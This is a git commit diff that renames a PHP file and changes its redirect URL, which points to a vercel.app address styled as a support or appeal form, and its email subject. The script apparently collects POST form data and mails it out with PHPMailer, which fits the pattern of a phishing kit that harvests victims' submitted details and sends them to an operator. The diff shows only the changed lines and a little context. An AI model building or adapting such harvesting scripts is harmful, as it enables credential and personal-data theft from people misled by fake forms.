9425c46ac358134f71b2a2485903c56d7b59cd71
mhussainofficial03 <mhussain.official03@gmail.com>
2025-08-15 18:43:43 +0800

    Update and rename rustam.php to nazeer.php

--- nazeer.php
+++ nazeer.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://apply-support-form-request-here.vercel.app/");
+header("Location: https://apply-review-for-request-team-here.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'RUSTAM';
+        $mail->Subject = 'NAZEER';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
